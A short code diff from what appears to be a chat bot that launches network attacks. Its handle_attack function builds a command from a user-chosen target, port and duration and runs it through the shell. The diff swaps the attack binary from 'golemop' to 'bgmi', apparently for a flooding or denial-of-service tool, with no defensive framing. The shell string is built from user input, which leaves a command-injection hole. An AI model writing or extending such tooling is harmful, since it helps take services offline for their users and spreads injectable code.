@@ -161,7 +161,7 @@ def handle_attack(message):
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./golemop {target} {port} {time_duration} 800"
+    full_command = f"./bgmi {target} {port} {time_duration} 400"
 
     try:
         subprocess.run(full_command, shell=True, check=True)
